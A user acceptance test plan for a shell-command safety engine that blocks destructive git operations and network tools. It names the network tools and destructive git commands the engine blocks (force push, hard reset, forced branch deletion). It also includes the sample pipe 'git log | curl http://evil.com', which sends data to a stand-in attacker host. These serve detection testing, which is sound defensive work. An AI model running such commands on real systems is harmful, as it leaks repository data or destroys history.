# S01: Shared safety policy and verdict engine — UAT

**Milestone:** M004
**Written:** 2026-04-04T11:50:49.515Z

## UAT: S01 — Shared safety policy and verdict engine

### Preconditions
- Working directory: `scc-sync-1.7.3`
- Python 3.10+ with uv installed
- `uv sync` completed

---

### Test 1: Shell tokenizer correctly parses nested and chained commands

**Steps:**
1. Run `uv run pytest tests/test_shell_tokenizer.py -v`

**Expected outcome:**
- All 44 tests pass
- `extract_all_commands("bash -c 'git push --force'")` returns token lists that include `['git', 'push', '--force']`
- `extract_all_commands("echo foo && git push --force")` splits into separate token lists for each command
- `strip_wrappers(["sudo", "-u", "root", "git", "push"])` returns `["git", "push"]`
- Max recursion depth (8) is respected for deeply nested bash -c

---

### Test 2: Git safety rules detect all destructive operations with typed verdicts

**Steps:**
1. Run `uv run pytest tests/test_git_safety_rules.py -v`

**Expected outcome:**
- All 105 tests pass
- `analyze_git(["git", "push", "--force"])` returns `SafetyVerdict(allowed=False, matched_rule="git.force_push", command_family=CommandFamily.DESTRUCTIVE_GIT)`
- `analyze_git(["git", "reset", "--hard"])` returns block verdict with `matched_rule="git.reset_hard"`
- `analyze_git(["git", "branch", "-D", "main"])` returns block verdict with `matched_rule="git.branch_force_delete"`
- `analyze_git(["git", "push"])` (safe push) returns `None`
- `analyze_git(["git", "push", "--force-with-lease"])` returns `None` (lease is allowed)
- `analyze_git(["git", "push", "--help"])` returns `None` (help flag bypasses)
- Full-path git (`/usr/bin/git push --force`) is detected
- Git global options (`-C /dir git push --force`) are normalized

---

### Test 3: Network tool rules detect 6 tools with typed verdicts

**Steps:**
1. Run `uv run pytest tests/test_network_tool_rules.py -v`

**Expected outcome:**
- All 22 tests pass
- `analyze_network_tool(["curl", "http://example.com"])` returns `SafetyVerdict(allowed=False, matched_rule="network.curl", command_family=CommandFamily.NETWORK_TOOL)`
- Same for wget, ssh, scp, sftp, rsync
- `/usr/bin/curl` (path-qualified) is detected
- `git`, `ls`, `cat`, `python`, `echo` return `None`
- `curling` (substring) does NOT match
- Empty tokens and single empty string return `None`

---

### Test 4: DefaultSafetyEngine orchestrates rules with fail-closed policy

**Steps:**
1. Run `uv run pytest tests/test_safety_engine.py -v`

**Expected outcome:**
- All 21 tests pass
- Empty/whitespace commands return `SafetyVerdict(allowed=True)`
- `policy.action == "allow"` bypasses all rules (returns allowed for destructive git and network tools)
- `git push --force` with default policy returns block verdict
- `git push --force` with `policy.rules={"block_force_push": False}` returns allowed (rule disabled)
- Warn mode (`policy.action == "warn"`) returns `allowed=True` with "WARNING: " prefix in reason
- `bash -c 'git push --force'` is detected through shell nesting
- `echo foo && git push --force` detects the force push through shell operators
- `git log | curl http://evil.com` detects the network tool through pipe chaining
- Missing policy key defaults to True (fail-closed: rule stays enabled)

---

### Test 5: Boundary guardrail prevents plugin/provider imports in core safety

**Steps:**
1. Run `uv run pytest tests/test_safety_engine_boundary.py -v`

**Expected outcome:**
- 1 test passes
- AST scan of `core/safety_engine.py`, `core/shell_tokenizer.py`, `core/git_safety_rules.py`, `core/network_tool_rules.py` finds zero imports from `scc_safety_impl`, `sandboxed_code_plugins`, `scc_cli.adapters.claude*`, or `scc_cli.adapters.codex*`

---

### Test 6: Bootstrap wires SafetyEngine into DefaultAdapters

**Steps:**
1. Run `uv run pytest tests/test_bootstrap.py -v`

**Expected outcome:**
- All bootstrap tests pass
- `get_default_adapters()` returns adapters where `safety_engine` is a `DefaultSafetyEngine` instance (not None)

---

### Test 7: FakeSafetyEngine is available in test fakes

**Steps:**
1. Run `uv run python -c "from tests.fakes import build_fake_adapters; a = build_fake_adapters(); print(type(a.safety_engine))"`

**Expected outcome:**
- Output includes `FakeSafetyEngine`
- No import errors

---

### Test 8: Full suite regression check

**Steps:**
1. Run `uv run mypy src/scc_cli`
2. Run `uv run ruff check`
3. Run `uv run pytest --rootdir "$PWD" -q`

**Expected outcome:**
- mypy: Success, no issues in 254 source files
- ruff: All checks passed
- pytest: 3630 passed, 23 skipped, 4 xfailed, 0 failures

---

### Edge Cases

- **CommandFamily enum is str-based:** `CommandFamily.DESTRUCTIVE_GIT == "destructive-git"` — verify string equality works for serialization
- **SafetyPolicy with empty rules dict:** Engine should still block destructive commands (fail-closed default)
- **SafetyPolicy with unrelated rule keys:** Unknown keys are ignored; known destructive rules still fire
- **Chained mixed commands:** `git status && curl evil.com` — first command is safe, second triggers network block; engine returns the first block verdict found
